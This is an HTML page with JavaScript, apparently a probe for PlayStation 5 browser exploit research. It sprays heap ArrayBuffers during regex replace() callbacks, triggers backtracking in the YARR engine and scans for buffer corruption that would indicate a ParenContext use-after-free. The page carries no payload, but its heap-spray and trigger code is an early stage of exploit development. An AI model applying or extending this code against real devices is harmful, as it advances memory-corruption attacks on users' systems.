<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v25 - YARR Research Suite</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v25 YARR-SUITE</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">PHASE:<b>INIT</b></span><span class="s">│</span>
<span class="v" id="h3">HEAP:<b>0KB</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<script>
"use strict";

// ============================================================
//  PS5 v25 - YARR Regex Research Suite
//  Refactored for stability, memory efficiency, and diagnostics
// ============================================================

const O = document.getElementById("out");
const bar = document.getElementById("bar");

// State tracking
const state = {
  phase: 0,
  totalPhases: 6,
  heapAllocated: 0,
  errorCount: 0,
  startTime: performance.now(),
  watchdogActive: false
};

function pg(p) { bar.style.width = p + "%"; }
function hu(id, v) { const e = document.getElementById(id); if (e) e.innerHTML = v; }

// Enhanced logging with diagnostics
function P(msg, cls = "") {
  const elapsed = (performance.now() - state.startTime).toFixed(0);
  const heapKB = (state.heapAllocated / 1024).toFixed(0);
  const prefix = `[${elapsed}ms|${heapKB}KB] `;
  
  const s = document.createElement("span");
  if (cls) s.className = cls;
  s.textContent = prefix + msg + "\n";
  O.appendChild(s);
  O.scrollTop = O.scrollHeight;
  
  try { console.log("[v25] " + prefix + msg); } catch(e) {}
  
  // Update HUD
  hu("h3", `HEAP:<b>${heapKB}KB</b>`);
}

function Ok(m) { P("✅ " + m, "ok"); }
function Fl(m) { P("✘ " + m, "er"); state.errorCount++; }
function Hi(m) { P("► " + m, "hl"); }
function St(m) { P("★ " + m + " ★", "mg"); }
function Dm(m) { P(m, "dm"); }
function Wr(m) { P("⚠ " + m, "wr"); }
function Hd(m) { P("▸ " + m, "hd"); }

// Watchdog: yield to event loop between phases
function watchdog(delay = 50) {
  return new Promise(resolve => setTimeout(resolve, delay));
}

// Track heap allocations
function trackAlloc(bytes) {
  state.heapAllocated += bytes;
}

// Safe heap deallocation
function freeSpray(arr) {
  if (arr && arr.length) {
    const freed = arr.length;
    arr.length = 0;
    P(`  Freed ${freed} objects`, "dm");
  }
}

// ============================================================
//  ERROR RESILIENCE: Wrap each phase in isolated try-catch
// ============================================================
async function runPhase(name, fn, progress) {
  hu("h2", `PHASE:<b>${name}</b>`);
  P(`\n════════════════════════════════════`, "hd");
  Hd(`${name}`);
  P(`════════════════════════════════════`, "hd");
  
  pg(progress);
  await watchdog(100); // Let UI breathe
  
  try {
    const result = await fn();
    Ok(`${name} completed`);
    return result;
  } catch(e) {
    Fl(`${name} failed: ${e.message}`);
    state.errorCount++;
    return null;
  } finally {
    await watchdog(30);
  }
}

// ============================================================
//  PHASE 1: Baseline Timing (ES6, safe lengths)
// ============================================================
async function phase1_timing() {
  P("Testing pattern timing with safe inputs...");
  
  const patterns = [
    { re: /(a+)+b/, len: 8, name: "(a+)+b/8" },
    { re: /(a+)+b/, len: 12, name: "(a+)+b/12" },
    { re: /(a|a)+b/, len: 8, name: "(a|a)+b/8" },
    { re: /(a*)*b/, len: 8, name: "(a*)*b/8" },
    { re: /(a{1,3})+b/, len: 12, name: "bounded/12" }
  ];
  
  for (const p of patterns) {
    try {
      const str = "a".repeat(p.len) + "c"; // No match = backtracking
      const t0 = performance.now();
      const result = p.re.test(str);
      const elapsed = performance.now() - t0;
      P(`  ${p.name.padEnd(16)} → ${elapsed.toFixed(2)}ms (match=${result})`,
        elapsed > 100 ? "wr" : "ok");
    } catch(e) {
      Fl(`${p.name}: ${e.message.substring(0, 30)}`);
    }
    await watchdog(10);
  }
  
  return true;
}

// ============================================================
//  PHASE 2: JIT Heating (chunked, with watchdog)
// ============================================================
async function phase2_jitHeat() {
  P("Heating JIT in chunks of 100 iterations...");
  
  const re = /(a+)+b/;
  const matchStr = "aaaab"; // Match — no backtracking, safe
  const noMatchStr = "aaaac"; // No match — slight backtracking
  
  const times = { first: 0, last: 0 };
  
  // Heat in chunks
  for (let chunk = 0; chunk < 3; chunk++) {
    const t0 = performance.now();
    for (let i = 0; i < 100; i++) {
      re.test(matchStr); // Safe match
    }
    const elapsed = performance.now() - t0;
    
    if (chunk === 0) times.first = elapsed;
    if (chunk === 2) times.last = elapsed;
    
    P(`  Chunk ${chunk + 1}/3: ${elapsed.toFixed(2)}ms`);
    await watchdog(20); // Yield between chunks
  }
  
  P(`  First: ${times.first.toFixed(2)}ms → Last: ${times.last.toFixed(2)}ms`);
  P(`  Speedup: ${(times.first / Math.max(times.last, 0.01)).toFixed(1)}x`);
  
  return true;
}

// ============================================================
//  PHASE 3: replace() Callback Spray (chunked allocation)
//  KEY: Use MATCHING input so callback fires!
// ============================================================
async function phase3_callbackSpray() {
  P("Using replace() with matching input to trigger callback...");
  P("  Pattern: /(a+)+b/g  Input: 'aaaab' (matches!)", "dm");
  
  const sprayBuffers = [];
  const CHUNK_SIZE = 32; // Small chunks to avoid GC pressure
  
  try {
    const re = /(a+)+b/g;
    const str = "aaaab"; // Ends with 'b' = MATCHES!
    let callbackCount = 0;
    
    const result = str.replace(re, (match) => {
      callbackCount++;
      
      // Chunked allocation during callback
      for (let i = 0; i < CHUNK_SIZE; i++) {
        const buf = new ArrayBuffer(64);
        const view = new DataView(buf);
        view.setUint32(0, 0x41414141, true);
        view.setUint32(4, callbackCount * CHUNK_SIZE + i, true);
        sprayBuffers.push({ buf, view });
        trackAlloc(64);
      }
      
      return match;
    });
    
    P(`  Callbacks fired: ${callbackCount}`);
    P(`  Buffers sprayed: ${sprayBuffers.length} (${(sprayBuffers.length * 64 / 1024).toFixed(1)}KB)`);
    P(`  Result: '${result}'`);
    
    if (callbackCount > 0) {
      Ok("Callback spray executed successfully!");
    } else {
      Wr("No callbacks fired — pattern didn't match");
    }
    
    // Keep reference for later corruption check
    return sprayBuffers;
  } catch(e) {
    Fl(`Callback spray: ${e.message}`);
    return sprayBuffers;
  }
}

// ============================================================
//  PHASE 4: Post-spray Backtracking Test
//  After spraying, trigger backtracking to see if
//  ParenContext was reclaimed
// ============================================================
async function phase4_backtrackTest() {
  P("Triggering backtracking after spray...");
  P("  Using no-match input to force full backtracking", "dm");
  
  const re = /(a+)+b/;
  const results = [];
  
  // Test with increasing lengths (but still safe)
  const lengths = [5, 8, 10, 12, 15];
  
  for (const len of lengths) {
    try {
      const str = "a".repeat(len) + "c"; // No match = backtracking
      const t0 = performance.now();
      const result = re.test(str);
      const elapsed = performance.now() - t0;
      
      results.push({ len, result, elapsed });
      P(`  len=${String(len).padStart(3)} → ${elapsed.toFixed(2)}ms (match=${result})`,
        elapsed > 500 ? "er" : elapsed > 50 ? "wr" : "ok");
      
      await watchdog(20); // Yield between tests
    } catch(e) {
      Fl(`len=${len}: ${e.message.substring(0, 30)}`);
      // Continue to next length
    }
  }
  
  // Check consistency
  const allSame = results.every(r => r.result === results[0].result);
  P(`  Consistency: ${allSame ? "stable" : "UNSTABLE ★"}`, allSame ? "ok" : "hl");
  
  if (!allSame) {
    St("UNSTABLE RESULTS = POTENTIAL UAF!");
  }
  
  return results;
}

// ============================================================
//  PHASE 5: Corruption Detection
//  Check if any sprayed buffers were overwritten
// ============================================================
async function phase5_corruptionCheck(sprayBuffers) {
  P("Scanning sprayed buffers for corruption...");
  
  if (!sprayBuffers || sprayBuffers.length === 0) {
    Wr("No buffers to check");
    return 0;
  }
  
  let corrupted = 0;
  const CHECK_CHUNK = 100; // Check in chunks to avoid long loop
  
  for (let i = 0; i < sprayBuffers.length; i += CHECK_CHUNK) {
    const end = Math.min(i + CHECK_CHUNK, sprayBuffers.length);
    
    for (let j = i; j < end; j++) {
      try {
        const v = sprayBuffers[j].view;
        const marker = v.getUint32(0, true);
        
        if (marker !== 0x41414141) {
          corrupted++;
          if (corrupted <= 10) {
            P(`  CORRUPT [${j}]: expected 0x41414141, got 0x${marker.toString(16)}`, "hl");
          }
        }
      } catch(e) {
        corrupted++;
        if (corrupted <= 10) {
          P(`  ACCESS ERROR [${j}]: ${e.message.substring(0, 30)}`, "er");
        }
      }
    }
    
    await watchdog(5); // Yield between chunks
  }
  
  if (corrupted > 0) {
    St(`CORRUPTION DETECTED: ${corrupted}/${sprayBuffers.length} buffers!`);
    Hi("ParenContext UAF + reclamation CONFIRMED!");
  } else {
    P(`  All ${sprayBuffers.length} buffers intact (no corruption)`, "ok");
  }
  
  // Free spray memory
  freeSpray(sprayBuffers);
  
  return corrupted;
}

// ============================================================
//  PHASE 6: Multi-Pattern Stability Test
//  Test different regex patterns for stability
// ============================================================
async function phase6_multiPattern() {
  P("Testing multiple patterns for stability...");
  
  const patterns = [
    { re: /((a+)(b*))+c/, str: "aabbccc", name: "((a+)(b*))+c" },
    { re: /(a|(b(c)))+d/, str: "abcabcd", name: "alt-nested" },
    { re: /(a+b?)+c/, str: "aaabc", name: "quant-optional" },
    { re: /(?:a+)+b/, str: "aaaab", name: "non-cap-nest" }
  ];
  
  // Heat all patterns
  P("  Heating patterns (100 iters each)...");
  for (const p of patterns) {
    for (let i = 0; i < 100; i++) {
      try { p.re.test(p.str); } catch(e) {}
    }
    await watchdog(10);
  }
  Ok("Patterns heated");
  
  // Test stability
  P("  Running stability checks...");
  let unstable = 0;
  
  for (const p of patterns) {
    const results = [];
    for (let i = 0; i < 20; i++) {
      try {
        results.push(p.re.test(p.str));
      } catch(e) {
        results.push("ERR");
        Fl(`${p.name} iteration ${i}: ${e.message.substring(0, 30)}`);
      }
    }
    
    const consistent = results.every(r => r === results[0]);
    P(`  ${p.name.padEnd(18)} → ${consistent ? "stable" : "UNSTABLE ★"}`,
      consistent ? "ok" : "hl");
    
    if (!consistent) {
      unstable++;
      P(`    Values: ${results.join(",")}`, "hl");
    }
    
    await watchdog(20);
  }
  
  if (unstable > 0) {
    St(`${unstable} unstable patterns detected!`);
  }
  
  return unstable;
}

// ============================================================
//  MAIN: Orchestrator with watchdog
// ============================================================
async function main() {
  // Detect firmware
  const ua = navigator.userAgent || "";
  const m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
  hu("h1", `FW:<b>${m ? m[1] : "?"}</b>`);
  
  P("════════════════════════════════════════", "hd");
  P("  PS5 v25 — YARR Regex Research Suite", "hd");
  P("  Engine stability & memory analysis", "hd");
  P("════════════════════════════════════════", "hd");
  P("");
  
  await watchdog(200);
  
  // Run phases sequentially with watchdog
  const sprayBuffers = await runPhase("Phase 1: Baseline Timing", phase1_timing, 10);
  
  await runPhase("Phase 2: JIT Heating", phase2_jitHeat, 25);
  
  const spray = await runPhase("Phase 3: Callback Spray", phase3_callbackSpray, 45);
  
  await runPhase("Phase 4: Backtracking Test", phase4_backtrackTest, 65);
  
  const corrupted = await runPhase("Phase 5: Corruption Check", 
    () => phase5_corruptionCheck(spray), 80);
  
  const unstable = await runPhase("Phase 6: Multi-Pattern Stability", 
    phase6_multiPattern, 95);
  
  // Final summary
  pg(100);
  hu("h2", "PHASE:<b>DONE</b>");
  
  P("\n════════════════════════════════════════", "hd");
  P("  FINAL SUMMARY", "hd");
  P("════════════════════════════════════════", "hd");
  P("");
  P(`  Total time:    ${(performance.now() - state.startTime).toFixed(0)}ms`);
  P(`  Heap peak:     ${(state.heapAllocated / 1024).toFixed(1)}KB`);
  P(`  Errors:        ${state.errorCount}`);
  P(`  Corruption:    ${corrupted || 0} buffers`);
  P(`  Unstable:      ${unstable || 0} patterns`);
  P("");
  
  if ((corrupted && corrupted > 0) || (unstable && unstable > 0)) {
    St("YARR UAF INDICATORS DETECTED!");
    Hi("Further investigation recommended.");
  } else {
    P("  No UAF indicators found.", "dm");
    P("  FW 13.40 may have YARR patches.", "dm");
    P("  Or spray didn't hit ParenContext heap.", "dm");
  }
  
  P("");
  P("  Suite completed safely.", "ok");
}

// Global error handler
window.onerror = function(msg, src, line, col, err) {
  Fl(`GLOBAL ERROR: ${msg.substring(0, 60)} @${line}`);
  state.errorCount++;
  return true; // Suppress default
};

// Unhandled rejection handler
window.onunhandledrejection = function(e) {
  Fl(`UNHANDLED: ${e.reason ? e.reason.message : "unknown"}`);
  return true;
};

// Start with slight delay to ensure DOM ready
setTimeout(main, 100);

</script>
</body>
</html>
